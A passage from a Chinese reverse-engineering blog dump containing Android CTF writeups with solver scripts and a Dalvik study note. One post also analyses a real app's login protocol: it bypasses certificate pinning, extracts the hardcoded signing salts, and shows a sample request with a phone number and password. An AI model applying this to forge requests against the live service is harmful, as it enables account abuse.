得到了getFlag（）的值。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200530112352.png)\n\n\n\n","tags":["CTF"],"categories":["Reverse"]},{"title":"新氧xx登录协议分析","url":"/2020/05/29/逆向/破解/新氧xx登录协议分析/","content":"\n# 新氧xx\n\n## 版本\n\n版本号：7.16.0\n\n## 安装JustTrustMe\n\n这里怎么安装 `xposed` 就不提了，主要是安装`JustTrustMe` 这个插件，不然可能抓不到登录的包。\n\n## 分析登录 uplog.php下的sign\n\n直接搜索`/uplog.php`找到` com.soyoung.statistic_library` 的包下，有个a方法，可是在jadx中没有转换过来。换到jeb中查看\n\n搜类名找到\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529123454.png)\n\n这里的sign就是一个简单的md5加密， \n\nsign = MD5(\"hive_soyoung@2017\"+ 时间戳)\n\n## 分析登录sign /v8/passport/apploginnew\n\n打开mumu模拟器，打开fiddler，挂上代理，启动ddms ，完成后，开始抓包\n\n点击登录后 界面会弹出`错误代码：`\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529103135.png)\n\n看看登录包的内容，记得登录两次，将两次的内容导出，比较其中你的区别。 这里可以用burp抓包，轻松查看不同。\n\n密码明文传输 很危险的。 回归正题 ，有三处不一样的地方：`request_id` 、 `_sign`、 `_time`。 一般在请求中带时间戳的，sign中很大可能使用了时间戳为加密字段之一。 \n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529103737.png)\n\n在做分析时，记得换个工具也许会开扩思路，在jadx中寻找关键字时 没有找到参数对应的关键字，可以试试用Jeb 去搜索一下。\n\n我在做逆向的时候喜欢先搜索一下url参数，在一个正规的app中，搜索url效率是比较高的。\n\n进入正题，分析 请求的参数：\n\n### request_id\n\n使用函数堆栈打印 hook 一下， 得到了`request_id` 的生成方式, 可以明显的看出，是一个包名+ 时间戳的形式，\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529110631.png)\n\n也从代码中搜索一下， 可以看到 a方法传入了一个包名，跟进a方法\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529110738.png)\n\n很明显是个包名加时间戳的md。 \n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529110822.png)\n\n### key\n\nkey随便没有变化，但还是一个加密的值，这里我在做sign的时候误打误撞把key先算出来了\n\n根据url追踪到这个方法\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529114129.png)\n\n然后跟进FlagSpUtils\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529114226.png)\n\nMD5 使用的是库里的 然后key的生成方式是 MD5(\"lavion_soyoung@2013_\"+\"手机号\"+\"\\_\"+\"密码\")\n\n\n\n\n\n### _sign\n\n同样先看看一键hook里有无hook到 ，没有找到_sign ，看来只能看代码了。\n\n先把`_sign`关键字在jadx和jeb搜索一下。\n\n在jeb中搜到一个_sign\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529111715.png)\n\n尝试hook一下看看，hook到的结果和请求的返回值一致 那么确定了就在这里\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529115115.png)\n\n看看源码 \n\n```\n代码分析\narg5 = \"_sydd=&_time=1590725814&app_id=2&cityId=0&key=05a063e9988212e286d3af7ef88c160f&login_name=17085714179&lver=7.16.0&password=123456z&pinyin=qq&request_id=cf6f4fa1c1cad9a45ce4ec48511c32cf&sys=2&uid=0&uuid=00000000-34ac-eba3-546a-de8e507b20a2\"\n进行一次替换\narg5 = \"_sydd=NeCsYWYUHdrB55xlJTOBQcdZsbkE1yWAUqBvyz1vGWFfzZqp_7.16.0&_time=1590725814&app_id=2&cityId=0&key=05a063e9988212e286d3af7ef88c160f&login_name=17085714179&lver=7.16.0&password=123456z&pinyin=qq&request_id=cf6f4fa1c1cad9a45ce4ec48511c32cf&sys=2&uid=0&uuid=00000000-34ac-eba3-546a-de8e507b20a2\"\n然后进行一次md5\nv1_1 = md5(arg5) = \"1b0edcfd3daa10a86c85c471500b14ed\"\n\n```\n\n\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529120307.png)\n\n这里有个调用了so层的方法，根据返回值，判断出 就是普通的一个替换，\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529152909.png)\n\n接下来看看_sign 生成的方式， 通过hook 拿到了加密前的参数。\n\n![](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\破解\\photo\\20200529120230.png)\n\n这里 使用jadx 没有反编译代码，我在jeb中分析\n\n然后分析`_sign`的加密算法\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529122056.png)\n\nhook的结果\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529122135.png)\n\n\n\n\n\n\n\n","tags":["破解"],"categories":["Reverse"]},{"title":"攻防世界-app1","url":"/2020/05/28/CTF/攻防世界/app1/","content":"\n# App1\n\n## 附件下载\n\nhttps://adworld.xctf.org.cn/media/task/attachments/b9af8dfef6b749d2819ef5be16c26a0d.apk\n\n## 分析\n\n看看逻辑 输入字符串判断\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200530121617.png)\n\n打开jadx 查看代码\n\n输入字符串应该为versionCode.charAt(i) ^ versionName ，\n\n看来要满足的条件是：\n\n​\tstr = versionCode.charAt(i) ^ versionName\n\n​\tstr.length = versionCode.length\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200530122044.png)\n\n动态调试一下，拿到这两个值`versionCode` 和 `versionName` 在操作中用jeb 一直附加失败（之后发现是自己的ddms 开着。）\n\n附上一张jeb 动态调试拿到的结果\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200530133755.png)\n\n\n\n后来找到了定义 原来这里不是获取的系统内容\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200530132107.png)\n\n```\nversionCode = 15\nversionName = X<cP[?PHNB<P?aj\n```\n\n## 脚本\n\n之前浪费了点时间在无意义的地方，最后发现都是一些简单的逻辑。\n\n```\nversionCode = 15\nversionName = \"X<cP[?PHNB<P?aj\"\nflag = \"\"\n\nfor i in range(0,versionCode):\n    flag += chr(ord(versionName[i]) ^versionCode)\nprint(flag)\n```\n\nflag: W3l_T0_GAM3_0ne","tags":["CTF"],"categories":["Reverse"]},{"title":"攻防世界-app2","url":"/2020/05/28/CTF/攻防世界/app2/","content":"\n# app2\n\n## 附件\n\n附件地址：https://adworld.xctf.org.cn/media/task/attachments/2554cf208cfb4cdf9218a840fa9bf237.apk\n\n## 分析\n\n先看逻辑，打开app 是一个登录界面，难道是sql注入，\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200528172841.png)\n\n点击登录后返回`Waiting fot you `\n\n打开jadx看看， 先搜索一下点击登录返回的字符串，没有找到结果\n\n打开ddms 看看，在log输出了用户名和密码，然后追踪到具体的log位置\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200528173942.png)\n\n之后`Intent intent = new Intent(this, SecondActivity.class);`,看看`SecondActivity `这个方法干了什么\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200528174644.png)\n\n看起来 判断了用户名+密码加密后的值\n\n那么进doRawData 看看\n\n ![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200528174928.png)\n\n打开ida 找到doRawData 方法， 可以判断出 这里做了一个AES_128_ECB_PKCS5Padding_Encrypt的加密。 这里注意，我当时打开x86 文件夹下的so分析时 没有提示key，而amei-v7a下面的分析时，key是提示出来的 不需要在动态调试。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529094907.png)\n\n放到在线的aes 解密工具中解密\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200528181035.png)\n\n将拿到的字符串分隔成两 去尝试登录 用户名：tencent 密码 aimage ，输入后直接闪退。看看源码做做了什么（ps 啥都没找到）\n\n到这里 基本已经做完了，没有头绪，去看了下wp 发现flag 在`FileDataActivity`下\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529100134.png)\n\n然后 解密 得到flag：Cas3_0f_A_CAK3\n\n在看 wp时发现还有另一种做法\n\n因为`FileDataActivity` 属于界面 可以通过 `adb shell am start com.tencent.testvuln/.FileDataActivity` 这种方式直接调用\n\n","tags":["CTF"],"categories":["Reverse"]},{"title":"攻防世界-eaasy-so","url":"/2020/05/26/CTF/攻防世界/easy-so/","content":"\n# easy-so\n\n附件地址：\n\nhttps://adworld.xctf.org.cn/media/task/attachments/456c1dab04b24036ba1d6e32a08dc882.apk\n\n## 分析\n\n安装apk文件，梳理逻辑，寻找flag隐藏方式，ddms 随时监听\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526101345.png)\n\n打开jadx 查看`验证失败` 是怎么出现的\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526101514.png)\n\n定位CheckString 函数，很明显 这是个so层的方法，那目的明确了 去so层找这个方法\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526102651.png)\n\n分析so层 搜索`Java_`关键字，找到checkstring ，跟进\n\n有个判断相等就返回1，那么回推v4 = f72c5a36569418a20907b55be5bf95ad\n\n`if ( !strcmp(v4, \"f72c5a36569418a20907b55be5bf95ad\") )`\n\nv4进行了一次`j_TestDec` ，那么可以判断\n\n跟进j_TestDec, 在TestDec 中有两个判断，第一个判断内做了一次前16位和后16位交换，第二个判断是两两之间做了一次交换。\n\n那逆推也就简单了。 和前面分析的几个题大致类似\n\n单独把TestDec拿出来 看看\n\n```\n  v1 = (char *)a1;\n  # 这里做了一个前16位和后16位的交换\n  if ( strlen(a1) >= 2 )\n  {\n    v2 = 0;\n    do\n    {\n      v3 = (int)&v1[v2];  v3 记录地址\n      v4 = v1[v2];\t\t\tv4 记录值\n      v1[v2] = v1[v2 + 16];  然后 str[0] = str[16] 此后 每次都是 str[v2] = str[v2+16]\n      ++v2; \n      *(_BYTE *)(v3 + 16) = v4;   str[v2+16] = v4\n    }\n    while ( v2 < strlen(v1) >> 1 );\n  }\n  result = (unsigned __int8)*v1;\n  # 这里做了一个两两交换\n  if ( *v1 )\n  {\n    *v1 = v1[1];   \n    v1[1] = result;\t\t\t\t\t\t\n    result = strlen(v1);\t\t\t\t\n    if ( result >= 3 )\n    {\n      v6 = 0;\n      do\n      {\n        v7 = (int)&v1[v6];   这里替换成熟悉的变量    \n        v8 = v1[v6 + 2];\tv8 用tmp表示\ttmp = v1[2]\t\t\t\n        *(_BYTE *)(v7 + 2) = v1[v6 + 3]; v1[2] = v1[3]\n        *(_BYTE *)(v7 + 3) = v8;\t\tv[3] = tmp\n        result = strlen(v1);\n        v9 = v6 + 4;\n        v6 += 2;\n      }\n      while ( v9 < result );\n    }\n  }\n```\n\n\n\n## 脚本\n\n```\nstr = list(\"f72c5a36569418a20907b55be5bf95ad\")\n\n# 反推\n# 做一次两两交换\nfor i in range(0, len(str), 2):\n    str[i], str[i + 1] = str[i + 1], str[i]\nprint(\"\".join(str))\n# 在做一次前16位和后16位的交换\nfor i in range(len(str) // 2):\n    str[i], str[i + 16] = str[i + 16], str[i]\nprint(\"\".join(str))\n# 记得加上flag{} 格式\n\n```\n\n","tags":["CTF"],"categories":["Reverse"]},{"title":"ctfhub-彩蛋","url":"/2020/05/26/CTF/ctfhub/彩蛋/","content":"\n# 彩蛋\n\n## 首页\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526083224.png)\n\n\n\n`*.ctfhub.com` 不确定是那个域名的首页，那么先搜索一下子域名瞧瞧 \n\n使用工具：Turbolist3r\n\n```\n[-] Total Unique Subdomains Found: 4\napi.ctfhub.com\nctfhub.com<BR>www.ctfhub.com\nstatic.ctfhub.com\nwriteup.ctfhub.com\n```\n\n第一个就命中了，ctrl+u 查看源代码，找到flag\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526083437.png)\n\n## 公众号\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526084053.png)\n\n看来不得不关注一波了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526083746.png)\n\n每一位CTF选手都是在为flag冲击\n\n\n\n## 题目入口\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526084116.png)\n\n那就找找题目的入口看看， 哈哈，找了个web题，\n\n打开正常 ，不存在flag， 然后经过。。。。。时间后，猜测可能报错会存在flag\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526084927.png)\n\n删除域名其中的字符使其报错，拿到`flag`\n\n## Writeup\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526085510.png)\n\n那就去writeup中找找，翻了好几个wp都没找到，还学习了很多知识，你确定是让我找flag，到处点点，最后在搜索处，以`flag`找到了flag\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526085647.png)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526085706.png)\n\n## 工具\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526085859.png)\n\n在工具中翻一翻，没有什么本站链接，然后灵机一动，翻到最后一页，拿到flag\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526090010.png)\n\n奇怪打开是404， 试了好几遍，发现了猫腻，居然会跳转到404 ，手速要快，还有可以F12查找\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526090121.png)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526090229.png)\n\n## 赛事\n\n有没有做到后面得心应手的感觉，那都是幻觉 醒醒\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526090333.png)\n\n和工具类似，直接翻到最后一页，拿到flag\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526090419.png)\n\n## 真题\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526090506.png)\n\n直接翻到最后一页，没有啥大的变化了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526090537.png)\n\n## 投稿提交\n\n\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526090812.png)\n\n来到writeup投稿，拿到前半段 flag[6:12] = \"{029e0\"\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526090742.png)\n\n然后在题目提交处，拿到感觉是中间一部分flag[12:18] = \"2eb3a1\"\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526090909.png)\n\n在wp投稿 源代码中找到最后一串flag\n\n```\nZmxhZyU1QjE4JTNBMjQlNUQlMjAlM0QlMjAlMjJlOGM0OWIlMjI=、\nbase64 -> urldecode 后\nflag[18:24] = \"e8c49b\"\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526091326.png)\n\n长记性了，再去题目提交出看看再次拿到一串字符串，这是16进制，转成字符串后得到24-30位的flag\n\n```\n666c61675b32343a33305d203d202231313332623522\n16进制转字符串\nflag[24:30] = \"1132b5\"\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526091642.png)\n\n发现 flag长度还是不够，接下来继续翻\n\n在题目提交中图片中找到一串flag ： flag[36:42] = \"a5f3a8\"\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526091952.png)\n\n在wp提交中图片中找到flag：flag[30:36] = \"15b652\"\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526092049.png)\n\n在下载demo中找到最后的flag\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526092234.png)\n\n6位字母混合是 26^6次方啊，爆破到啥时候了，百度了下，密码是ctfhub，那我也不写脚本爆破了，直接拿来获得正解。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200526094003.png)\n\n\n\n\n\n最后的flag是：ctfhub{029e02eb3a1e8c49b}\n\n","tags":["CTF"],"categories":["Misc"]},{"title":"攻防世界-easyjni","url":"/2020/05/25/CTF/攻防世界/easyjni/","content":"\n# easyjni\n\n下载附件地址：https://adworld.xctf.org.cn/media/task/attachments/eb760e6a10ea4dcab700a6b7db948488.apk\n\n\n\n## 分析\n\n安装apk，先看看逻辑，打开后发现输入字符串，然后系统判断正确与否，那么就要自己去啃算法了\n\n打开jadx ，定位到oncrete处，`if`判断决定了是正确还是失败，跟进其中的方法查看\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200525180305.png)\n\n在a方法中，当`ncheck(new a().a(str.getBytes()))` 才能返回正确，那么继续跟进，看何时返回`True`\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200525180459.png)\n\n先分析一个`new a().a(str.getBytes())` 获得了什么\n\n输入一个a \n\na.getBytes(): [B@1540e19d\n\n输出 23==\n\n做了一个类似base64编码的算法\n\n下来看ncheck \n\n\n\n定位到如下，看来居然是在so层进行的判断。那么打开ida 查看，so文件在lib下\n\n`    private native boolean ncheck(String str);`\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200525183450.png)\n\n搜索Java下划线开头的方法，只有一个，那么就查看他了，进去后tab一下，查看伪代码\n\n从后往前分析， return=1  时  v12 为空，那么 memcmp 方法中s1 ==MbT3sQgX039i3g==AQOoMQFPskB1Bsc7\n\n\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200525184022.png)\n\n```\nv5 = (env->functions->GetStringUTFChars)(env, str, 0);\n  if ( strlen(v5) == 32 )\n  {\n    v6 = 0;\n    do\n    {\n      v7 = &s1[v6];\n      s1[v6] = v5[v6 + 16];\n      v8 = v5[v6++];\n      v7[16] = v8;\n    }// 前16位和后16位 交换\n    while ( v6 != 16 );\n    (env_1->functions->ReleaseStringUTFChars)(env_1, v4, v5);\n    v9 = 0;\n    do\n    {\n      v11 = __OFSUB__(v9, 30);\n      v10 = v9 - 30 < 0;\n      v15 = s1[v9];\n      s1[v9] = s1[v9 + 1];\n      s1[v9 + 1] = v15;\n      v9 += 2; \n    } // 两两之间交换\n    while ( v10 ^ v11 );\n    v12 = memcmp(s1, \"MbT3sQgX039i3g==AQOoMQFPskB1Bsc7\", ' ');\n```\n\n所以解密的方式也就清晰了，先解决so层，得到传入so层的值，然后解决java层 得到flag\n\n\n\n## 脚本\n\n脚本分为两个部分 so（）是解决so里面的两个加密， 一个是两两交换，一个是前16和后16交换，之后是java层的加密，是一个替换了base64表的加密，只需要更换base64 表，重新接码即可，\n\n```\ndef so():\n    str = list(\"MbT3sQgX039i3g==AQOoMQFPskB1Bsc7\")\n    print(len(str))\n    # 先两两交换\n    for i in range(0,len(str),2):\n        str[i],str[i+1] = str[i+1],str[i]\n    print(\"\".join(str))\n    # 然后将str 的前16位和后16位交换\n    for i in  range(len(str)//2):\n        str[i],str[i+16] = str[i+16],str[i]\n    print(\"\".join(str))\n    return \"\".join(str)\n# 之后就是java层的，和解码base64类似\n\n\ndef unbase(string:str)->str:\n    oldstr = ''\n    unbase = ''\n    base64_list = ['i', '5', 'j', 'L', 'W', '7', 'S', '0', 'G', 'X', '6',\n                    'u', 'f', '1', 'c', 'v', '3', 'n', 'y', '4', 'q', '8',\n                    'e', 's', '2', 'Q', '+', 'b', 'd', 'k', 'Y', 'g', 'K',\n                    'O', 'I', 'T', '/', 't', 'A', 'x', 'U', 'r', 'F', 'l',\n                    'V', 'P', 'z', 'h', 'm', 'o', 'w', '9', 'B', 'H', 'C',\n                    'M', 'D', 'p', 'E', 'a', 'J', 'R', 'Z', 'N']\n    for i in string.replace('=',''):\n        oldstr += '{:06}'.format(int(bin(base64_list.index(i)).replace('0b', '')))\n    newstr = ['{}'.format(oldstr[j:j + 8]) for j in range(0, len(oldstr), 8)]\n    for l in range(len(newstr)):\n        unbase += chr(int(newstr[l], 2))\n\n    print(unbase)\nif __name__ == \"__main__\":\n    unbase(so())\n\n\n# 参考 ： https://blog.csdn.net/Leeeey/article/details/89517254 找到一个base64 解码的python脚本\n\n结果：flag{just_ANot#er_@p3} \n\n```\n\n\n\n","tags":["CTF"],"categories":["Reverse"]},{"title":"攻防世界-easyjava","url":"/2020/05/25/CTF/攻防世界/easyjava/","content":"\n\n\n## 攻防世界题解easyjava\n\n好无聊啊，找个CTF做做，攻防世界有一栏Mobile的 正好适合\n\n下载文件地址： \n\nhttps://adworld.xctf.org.cn/media/task/attachments/3f06e60ded5e44e3b0f4c47020cbcb3c.apk\n\n\n\n\n\n## 分析\n\n使用`jadx`工具 反编译查看代码，先看看App 的oncreate方法\n\n有一个`if`判断，判断正确 返回`You are right` 否则 返回 `Your are wrong! Bye~`\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200523155923.png)\n\n\n\n```\nMainActivity.b(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString()).booleanValue()\n```\n\n大致意思是 传入了一个值，然后在b方法中调用 ，返回的结果转为bool类型，那么就是说这里的返回值要求为1 才能进入`if`判断\n\n看一下b方法 中的逻辑\n\n```\npublic static Boolean b(String str) { // 传入一个String类型\n        if (!str.startsWith(\"flag{\")) { // 判断是否以flag{ 开始  \n            return false;\n        }\n        if (!str.endsWith(\"}\")) { // 判断是否以} 结尾\n            return false;\n        }\n        String substring = str.substring(5, str.length() - 1); // 去除 flag{ 和} 之后的结果保存到substring中\n        b bVar = new b(2); // 这里我单独拉出来了 运行了一下，得到了结果\n        a aVar = new a(3);\n        // 这里就讲bvar 和aVar 写成明文\n        String bVar = \"ctf.demo.b@1540e19d\";\n        String aVar = \"ctf.demo.a@1540e19d\";\n        // 分析for循环\n        StringBuilder sb = new StringBuilder();\n        int i = 0;\n        for (int i2 = 0; i2 < substring.length(); i2++) {\n            sb.append(a(substring.charAt(i2) + \"\", bVar, aVar));\n            Integer valueOf = Integer.valueOf(bVar.b().intValue() / 25);\n            if (valueOf.intValue() > i && valueOf.intValue() >= 1) {\n                i++;\n            }\n        }\n        return Boolean.valueOf(sb.toString().equals(\"wigwrkaugala\"));\n    }\n\n```\n\nbVar: ctf.demo.b@1540e19d\n\n\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200523162216.png)\n\naVar: ctf.demo.a@1540e19d\n\n通过加注释获得了了解到整个流程\n\n```\nflag{zdgd}\n-----------------------\nb->abcdefghijklmnopqrstuvwxyz\nb.a(String str) ->z\nInteger.valueOf(b.indexOf(str))->25\na->[17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25]  因为每次判断都是长度减一  所以当判断25次就结束了 第一次给z 循环判断失败。i等于0\nb: i ->0\na.a a(Integer num)->0 将i 传入 aVar.a(i)\na: a(Integer num) -> [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16] 寻找0的位置 在第16次找到\na:a ->[21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]\nnum2 ->16 a类中的b 是个固定的。所以最后得到的第16位就是q\nb->abcdefghijklmnopqrstuvwxyz\nb.charAt(num2.intValue())->q\n-----------------------\nb->bcdefghijklmnopqrstuvwxyza\nb.a(String str) ->d\nInteger.valueOf(b.indexOf(str))2\na->[23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25, 17]\na.get(i2)->13\nb: i ->13\na.a a(Integer num)->13\na: a(Integer num) -> [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]\na:a ->[21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]\nnum2 ->10\nb->abcdefghijklmnopqrstuvwxyz\nb.charAt(num2.intValue())->k\n-----------------------\nb->cdefghijklmnopqrstuvwxyzab\nb.a(String str) ->g\nInteger.valueOf(b.indexOf(str))4\na->[7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25, 17, 23]\na.get(i2)->14\nb: i ->14\na.a a(Integer num)->14\na: a(Integer num) -> [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]\na:a ->[21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]\nnum2 ->24\nb->abcdefghijklmnopqrstuvwxyz\nb.charAt(num2.intValue())->y\n-----------------------\nb->defghijklmnopqrstuvwxyzabc\nb.a(String str) ->d\nInteger.valueOf(b.indexOf(str))0\na->[22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25, 17, 23, 7]\na.get(i2)->6\nb: i ->6\na.a a(Integer num)->6\na: a(Integer num) -> [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]\na:a ->[21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]\nnum2 ->9\nb->abcdefghijklmnopqrstuvwxyz\nb.charAt(num2.intValue())->j\nqkyj\n```\n\n所以逆推的方式：\n\n​\t第一次 b = “abcdefghijklmnopqrstuvwxyz”；\t之后每次都会做一次循环左移操作\n\n​\t第一次b 对应的序列[17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25]  之后每次进行一次循环左移\n\n1. 获得`wigwrkaugala`每一位在字母表中的位置\n\n   比如 w 在字符表中的位置是22， \n\n2. 然后在a类中的a函数获取每一位位置对应的数num\n\n   然后在[21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16] 找到22对应的数，  为8\n\n3. 之后将获得的数num找到a序列中第num位对应的数字\n\n   8 找到对应的数为 21\n\n   [17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25]\n\n4. 将拿到后的数字在b字符串中寻找对应的数，\n\n   然后在 abcdefghijklmnopqrstuvwxyz 找到21 对应的数字为 v\n\n\n\n## 脚本\n\n逻辑理清了 接下来写脚本\n\n```\n\nb = \"abcdefghijklmnopqrstuvwxyz\"\nresult = \"wigwrkaugala\"\nLa = [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]\nLb = [17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25]\n\nstr1 = []\nflag = \"\"\nfor i in result:\n    str1.append(La[b.index(i)])\n\nprint(str1)\n\nfor i in str1:\n    str2 = Lb[i]\n    flag += b[str2]\n    b = b[1:]+ b[:1]\n    Lb.insert(len(Lb), Lb[0])\n    Lb.remove(Lb[0])\nprint(flag)\n```\n\n[8, 17, 15, 8, 22, 13, 21, 23, 15, 21, 3, 21]\nvenividivkcr\n\n备注： 脚本 参考 西瓜西米露表姐。","tags":["CTF"],"categories":["Reverse"]},{"title":"小白学习--dalvik指令集","url":"/2020/05/23/逆向/基础/dalvik指令集/","content":"\n为什么要写这个， 因为看的太枯燥了，自己手打一遍 加深记忆。\n\n# 1 dalvik 字节码\n\n在说指令集前 先简单的回忆一下dalvik字节码的相关知识。\n\n## 1.1 Dalvik 寄存器\n\n`Dalvik`寄存器分为32位和64位，小于等于32位的使用一个寄存器标识，64位使用两个相邻寄存器标识，\n\n## 1.2 寄存器的命名法\n\n寄存器有两种命名方式：v命名法和p命名法\n\n**v命名法**\n\n局部变量寄存器 v0-vn 表示，参数寄存器从vn - v(n+m)\n\n比如 在下图中，使用了v1,v2,v3,v4,v5,其中 v0,v1,v2 是局部变量，v3 和v4 是参数。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200523110407.png)\n\n\n\n**p命名法**\n\n变量寄存器 v0-vn  参数寄存器 p0-pn\n\np命名法比v命名法容易辨识,参数和变量采用不同的字母表示，但两者表示的含义都是一样的，没有什么区别。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200523110815.png)\n\n\n\n## 1.3 了解dex反编译工具\n\n**java 文件到smali文件的过程**\n\n`.java`编译成`.class`在线编译成`.dex`，最后反编译成`smali`文件 \n\n**class 文件打包成dex**\n\n> dx --dex --output=Decrypt.dex com/xiaomutou/demo/Decrypt.class\n\n**dex文件反编译成samli文件**\n\n> java -jar baksmali.jar -o smali_out/ classex.dex\n\n**smali 打包成dex**\n\n> java -jar smali.jar smali_out/ -o classes.dex\n\n## 1.4 Dalvik 字节码类型\n\n在Dalvik中有一种描述类型的方式和Java对应，下面给出具体规则\n\n| Dalvik | Java       |\n| ------ | ---------- |\n| B      | byte       |\n| C      | char       |\n| S      | short      |\n| I      | int        |\n| J      | long       |\n| F      | float      |\n| D      | double     |\n| Z      | boolean    |\n| V      | void       |\n| L      | Java类类型 |\n| [      | 数组类型   |\n\n## 1.5 